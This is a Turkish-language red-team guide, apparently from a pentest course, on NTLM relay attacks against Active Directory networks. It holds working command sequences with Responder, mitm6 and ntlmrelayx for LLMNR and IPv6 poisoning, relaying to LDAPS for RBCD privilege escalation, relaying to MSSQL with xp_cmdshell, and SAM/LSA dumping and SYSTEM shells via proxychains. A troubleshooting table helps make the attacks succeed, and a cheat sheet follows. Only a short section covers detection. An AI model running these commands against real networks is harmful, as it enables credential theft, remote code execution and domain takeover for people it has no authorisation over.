## 1. Genel Bakış ve Relay Mantığı

NTLM kimlik doğrulaması matematiksel olarak bir **Challenge-Response** el sıkışmasıdır. İstemci parolasını asla açık metin olarak ağa iletmez; bunun yerine sunucunun ürettiği 8 baytlık rastgele bir soruya (Challenge / Nonce), kendi NT parolasının karmasıyla (NT Hash) şifreli bir yanıt (NTLMv2 Response) döndürür.

Bu tasarımın en temel güvenlik zaafı şudur:
> **Challenge-Response akışı, istemcinin kimliğini doğrular ancak kimlik doğrulanan sunucunun gerçekten hedef sunucu olup olmadığını doğrulamaz.**
> Ağda araya giren (Man-in-the-Middle) veya istemciyi kendisine bağlanmaya zorlayan bir saldırgan; gelen NTLM el sıkışmasını **hiç parola kırmadan (offline crack gerekmeksizin)** hedef bir servise (SMB, LDAPS, MSSQL, HTTP) aynen ileterek kurbanın yetkileriyle oturum açabilir.

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                       NTLMSSP RELAY MİMARİ AKIŞI                            │
└─────────────────────────────────────────────────────────────────────────────┘
                                      │
  [KURBAN (Client / Server)]     [SALDIRGAN (ntlmrelayx)]       [HEDEF (DC / SQL / CA)]
              │                              │                             │
              │── 1. NEGOTIATE (Type 1) ────▶│                             │
              │                              │── 2. NEGOTIATE (Type 1) ───▶│
              │                              │                             │
              │                              │◀─ 3. CHALLENGE (Type 2) ────│
              │◀─ 4. CHALLENGE (Type 2) ─────│   (Hedefin Server Nonce'u)  │
              │                              │                             │
              │── 5. AUTHENTICATE (Type 3) ─▶│                             │
              │   (NetNTLMv2 Hesaplanmış)    │── 6. AUTHENTICATE (Type 3) ─▶│
              │                              │   [--remove-mic / No Sign]  │
              │                              │                             ▼
              │                              │                 [OTURUM ONAYLANDI!]
              │                              │                 - RBCD / Shadow Cred
              │                              │                 - SYSTEM Shell / Dump
```

### 1.1 Protokol ve İmzalama Matrisi

| Kaynak Protokol | Hedef Servis | İmzalama / Güvenlik Kısıtı | Tipik Operasyonel Kazanım |
|---|---|---|---|
| **SMB** | **SMB (Port 445)** | Hedefte SMB Signing `Required` olmamalıdır. | Uzaktan kod yürütme (`smbexec` / `psexec`), SAM ve LSA dökümü. |
| **SMB** | **LDAPS (Port 636)** | LDAP Signing ve Channel Binding (EPA) kapalı olmalıdır. | Hedef makine adına **RBCD** yazma veya Shadow Credentials enjeksiyonu. |
| **HTTP / WebDAV** | **LDAP / LDAPS** | HTTP oturumları imza taşımadığından LDAP'a doğrudan aktarılabilir. | Active Directory nesne modifikasyonu, grup üyeliği ekleme. |
| **SMB / RPC** | **AD CS Web (HTTP)** | Web Enrollment HTTP imzalama ve EPA içermez. | **ESC8:** Hedef makine (DC dahil) adına dijital sertifika alma ([08.3](./08.3_Relay_AD_CS_ESC8_Zinciri.md)). |
| **SMB** | **MSSQL (Port 1433)** | MSSQL şifreleme zorunlu kılınmamış olmalıdır. | Veritabanında `sysadmin` yetkisi, `xp_cmdshell` ile kod yürütme. |

## 2. Derinlemesine Teknik Mekanizmalar

### 2.1 Çapraz Protokol (Cross-Protocol) Relay ve MIC Baypas (CVE-2019-1040)
NTLM Type 3 mesajı içerisindeki `NTLMv2_RESPONSE`, yalnızca sunucu tarafından sağlanan `nonce` değerine bağlıdır; el sıkışmanın hangi taşıyıcı protokol (SMB, HTTP, RPC) üzerinden aktığını doğrulamaz:
- Microsoft, SMB üzerinden gelen kimlik doğrulamaların LDAP gibi diğer servislere aktarılmasını önlemek amacıyla Type 3 mesajına **Message Integrity Code (MIC)** ekledi.
- **Drop the MIC (CVE-2019-1040):** Saldırganlar NTLM Type 2 ve Type 3 başlıklarındaki `msvAvFlags` alanını değiştirip MIC imzasını kaldırarak SMB trafiğini LDAP/LDAPS protokollerine yönlendirmeyi başardılar (`ntlmrelayx --remove-mic`).
- Günümüzde bu zaaf yamalanmış olsa bile, **HTTP ve WebDAV kaynaklı kimlik doğrulamalar doğası gereği MIC imzası taşımadığından** LDAP servisine doğrudan relay edilebilir.

### 2.2 SOCKS Proxy ve Çoklu Oturum Yönetimi (`-socks`)
Geleneksel relay araçları her NTLM bağlantısını tek bir hedef komut için tüketir. Impacket `ntlmrelayx -socks` parametresiyle çalıştırıldığında:
- Başarıyla doğrulanan her kurban oturumunu canlı bir SOCKS4/SOCKS5 proxy motoruna kaydeder.
- Saldırgan `proxychains` kullanarak aynı kimlik doğrulama oturumu üzerinden saatlerce SMB, WMI, LDAP ve MSSQL komutları çalıştırabilir.

### 2.3 mitm6 ile IPv6 / DNS Zehirleme
Modern Windows işletim sistemleri ağ yapılandırmasında IPv6 protokolünü IPv4'e tercih eder. Kurumsal ağlarda genellikle IPv6 DHCP sunucusu bulunmaz:
- `mitm6`, ağda sahte bir DHCPv6 sunucusu kurarak kurban istemcilere kendi IP'sini DNS sunucusu olarak tanıtır.
- İstemciler internete veya yerel kaynaklara erişmek istediğinde saldırganın WPAD (Web Proxy Auto-Discovery) adresine yönlendirilir.
- İstemci tarayıcısı veya işletim sistemi saldırgana HTTP üzerinden NTLM kimlik doğrulaması gönderir.
- Bu HTTP kimlik doğrulaması hiçbir imzalama kısıtı olmadan doğrudan **Domain Controller'ın LDAPS servisine relay edilir**.

## 3. Pratik Sömürü Senaryoları ve Araç Kullanımı

### Senaryo 1: NetExec ile İmzasız SMB Hedeflerini Listeleme
```bash
# Alt ağdaki tüm sistemleri tarayarak SMB imzalama zorunlu olmayan (signing=False) hedefleri dosyaya yaz
nxc smb 10.10.10.0/24 --gen-relay-list targets.txt
```

### Senaryo 2: SMB Relay ile SOCKS Proxy Oturumu Açma
```bash
# 1. ntlmrelayx'i SOCKS desteği ile başlat
impacket-ntlmrelayx -tf targets.txt -smb2support -socks

# 2. Responder ile ağdaki LLMNR/NBT-NS sorgularını zehirle (Responder.conf'ta SMB ve HTTP OFF olmalı)
sudo responder -I eth0 -dwv

# 3. Kurban bağlandığında SOCKS arayüzünü (127.0.0.1:1080) proxychains ile kullan
proxychains impacket-secretsdump -no-pass 'CORP/victim@10.10.10.50'
```

### Senaryo 3: SMB → LDAPS Relay ile Otomatik RBCD Enjeksiyonu
```bash
# Kurban sunucuyu (SRV01$) DC'nin LDAPS servisine relay ederek saldırgan makinesine (EVILPC$) tam yetki verme
impacket-ntlmrelayx -t ldaps://10.10.10.5 --delegate-access --escalate-user EVILPC$ -smb2support
```
**Beklenen Operasyonel Çıktı:**
```
[*] SMBD-Thread-5: Connection from CORP/SRV01$@10.10.10.30 controlled, relaying to ldaps://10.10.10.5
[*] Authenticating against ldaps://10.10.10.5 as CORP/SRV01$ SUCCEED
[*] Modifying msDS-AllowedToActOnBehalfOfOtherIdentity for CN=SRV01,OU=Servers,DC=corp,DC=local
[*] Delegation rights modified successfully! EVILPC$ can now impersonate users on SRV01$
```

### Senaryo 4: mitm6 + ntlmrelayx ile WPAD / HTTP → LDAPS Relay
```bash
# 1. Terminal 1: mitm6 ile IPv6 DNS zehirlemesi başlat
sudo mitm6 -d corp.local -i eth0

# 2. Terminal 2: ntlmrelayx ile WPAD bağlantılarını DC LDAPS'a yönlendir
impacket-ntlmrelayx -6 -t ldaps://10.10.10.5 -wh attacker-wpad.corp.local --delegate-access --escalate-user EVILPC$
```

### Senaryo 5: MSSQL Servisine Relay ve Komut Yürütme
```bash
# Kurban oturumunu veritabanı sunucusuna relay ederek xp_cmdshell ile komut çalıştırma
impacket-ntlmrelayx -t mssql://10.10.10.15 -smb2support -q "EXEC xp_cmdshell 'whoami'"
```

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata / İstisna Mesajı | Kök Neden Analizi | Kesin Çözüm ve Operasyonel Adım |
|---|---|---|
| `STATUS_ACCESS_DENIED (Signature Required)` | Hedef sistemde SMB İmzalama (SMB Signing) zorunlu tutuluyor. | `targets.txt` dosyasından bu sistemi çıkarın; yalnızca `signing=False` olan üye sunucuları veya iş istasyonlarını hedefleyin. |
| `LDAP: Strong Auth Required / Channel Binding` | DC üzerinde LDAP Signing veya Channel Binding (EPA) tam zorlama modundadır (`LdapEnforceChannelBinding=2`). | SMB kaynaklı relay çalışmaz; HTTP/WebDAV koersiyon vektörlerini ([08.2](./08.2_PetitPotam_PrinterBug_DFSCoerce.md)) veya AD CS ESC8'i deneyin. |
| `Attack failed: Message Integrity Check (MIC) verified` | CVE-2019-1040 yamalı bir DC'ye SMB üzerinden Type 3 iletildi; MIC doğrulaması başarısız oldu. | Hedefe SMB yerine HTTP trafiği relay edin (mitm6 veya WebDAV koersiyonu). |
| `Connection reset by peer / Broken pipe` | ntlmrelayx ile hedef sunucu arasındaki el sıkışma zaman aşımına uğradı. | Saldırgan makinesinde güvenlik duvarını ve MTU ayarlarını kontrol edin; yerel port çakışmalarını temizleyin. |
| `Same-box relay detected (Drop connection)` | Kurban makineden gelen kimlik doğrulaması yine kurban makinenin kendisine relay edilmeye çalışıldı. | Windows MS08-068 yaması ile yerel relay engellenmiştir; kurban A'dan gelen oturumu her zaman hedef B'ye yönlendirin. |
| `Responder conflicts with ntlmrelayx port 445/80` | Responder ve ntlmrelayx aynı anda 445 veya 80 portunu dinlemeye çalışıyor. | `Responder.conf` dosyasını açarak `SMB = Off` ve `HTTP = Off` yapın; bu portları ntlmrelayx'e bırakın. |

## 5. OPSEC ve Karşı Tespit (IOC & Telemetry)

### 5.1 Olay Günlüğü İmzaları (Windows Security Logs)
- **Event ID 4624 (Logon Type 3 - Network):** `LogonProcessName: NtLmSsp` ve `AuthenticationPackageName: NTLM`. En kritik gösterge; **kurban makine hesabının (`SRV01$`) hedef DC'ye kendi IP adresi haricinde (saldırgan IP'sinden) oturum açmasıdır**.
- **Event ID 5136 (Dizin Hizmeti Nesnesi Değiştirildi):** Relay ile DC üzerinde `msDS-AllowedToActOnBehalfOfOtherIdentity` veya `msDS-KeyCredentialLink` yazıldığında üretilir.
- **Event ID 4672 (Özel Ayrıcalıklar Atandı):** Relay edilen oturum Administrator haklarına sahipse hedef makinede loglanır.
- **Ağ Seviyesinde mitm6 İmzaları:** Ağda olağan dışı DHCPv6 `Reply` paketleri ve yoğun DNS AAAA sorguları.

### 5.2 SIEM / EDR Tespit Kuralı (KQL / Sigma)
```kql
// KQL: Makine Hesabının Anormal IP Adresinden NTLM Ağ Oturumu Açması (Relay Tespiti)
SecurityEvent
| where EventID == 4624 and LogonType == 3 and AuthenticationPackageName == "NTLM"
| where TargetUserName endswith "$" and TargetUserName !in ("SYSTEM", "NETWORK SERVICE")
| extend SourceIP = IpAddress, AccountName = TargetUserName
| where SourceIP != "127.0.0.1" and SourceIP != "::1"
| project TimeGenerated, Computer, AccountName, SourceIP, WorkstationName
```

## 6. Hızlı Referans / Cheat Sheet

### Komut 1: NetExec ile SMB İmzalama Listesi Çıkarma
```bash
nxc smb 10.10.10.0/24 --gen-relay-list targets.txt
```
- **Ne Yapar?** Belirtilen alt ağdaki tüm sunucuları tarar ve SMB imzalama zorunluluğu olmayan sistemleri `targets.txt` dosyasına yazar.
- **Ne Zaman Kullanılır?** ntlmrelayx dinleyicisine hedef liste hazırlarken.
- **Parametreler:** `--gen-relay-list`: Yalnızca sömürülebilir sistemleri filtreler.

### Komut 2: impacket-ntlmrelayx ile SOCKS Proxy Başlatma
```bash
impacket-ntlmrelayx -tf targets.txt -smb2support -socks
```
- **Ne Yapar?** Hedef sistemlere yönelik SMB relay dinleyicisi açar ve başarılı kimlik doğrulamalarını canlı SOCKS oturumuna kaydeder.
- **Ne Zaman Kullanılır?** Kurban bağlantılarından çok sayıda etkileşimli oturum türetmek için.
- **Parametreler:** `-tf`: Hedef dosya yolu; `-smb2support`: SMBv2/v3 desteği; `-socks`: SOCKS proxy motoru.

### Komut 3: proxychains ile Relay Oturumu Üzerinden Komut Çalıştırma
```bash
proxychains impacket-smbexec -no-pass 'CORP/victim@10.10.10.50'
```
- **Ne Yapar?** ntlmrelayx tarafından SOCKS havuzunda tutulan oturumu kullanarak parola sormadan hedefte SYSTEM komut satırı açar.
- **Ne Zaman Kullanılır?** Relay başarılı olduktan sonra hedefte yanal hareket gerçekleştirmek için.
- **Parametreler:** `-no-pass`: Kimlik doğrulama için SOCKS oturumunu kullanır.

### Komut 4: LDAPS Relay ile Hedef Makineye RBCD Yetkisi Ekleme
```bash
impacket-ntlmrelayx -t ldaps://10.10.10.5 --delegate-access --escalate-user EVILPC$ -smb2support
```
- **Ne Yapar?** Kurban makine oturumunu DC'nin LDAPS servisine aktararak kurban üzerinde `EVILPC$` makinesine taklit yetkisi yazar.
- **Ne Zaman Kullanılır?** Makine hesabı koersiyonu sonrası o makinede kalıcı SYSTEM yetkisi elde etmek için.
- **Parametreler:** `--delegate-access`: RBCD izni yazar; `--escalate-user`: Yetkilendirilecek saldırgan hesabı.

### Komut 5: mitm6 ile IPv6 DNS Zehirleme Başlatma
```bash
sudo mitm6 -d corp.local -i eth0
```
- **Ne Yapar?** Yerel ağda sahte DHCPv6 dağıtarak istemcilerin DNS sorgularını saldırgan makinesine çeker.
- **Ne Zaman Kullanılır?** Kurumsal ağda LLMNR/NBT-NS kapalıyken HTTP WPAD trafiği üretmek için.
- **Parametreler:** `-d`: Hedef etki alanı adı; `-i`: Dinlenecek ağ arayüzü.

### Komut 6: MSSQL Relay ile Doğrudan SQL Sorgusu Çalıştırma
```bash
impacket-ntlmrelayx -t mssql://10.10.10.15 -smb2support -q "SELECT @@version"
```
- **Ne Yapar?** Gelen NTLM oturumunu MSSQL veritabanı servisine ileterek belirtilen SQL sorgusunu yürütür.
- **Ne Zaman Kullanılır?** Veritabanı yöneticisi kimliği relay edildiğinde doğrudan SQL komutları çalıştırmak için.
- **Parametreler:** `-t`: Hedef MSSQL bağlantı URI'si; `-q`: Çalıştırılacak SQL sorgusu.
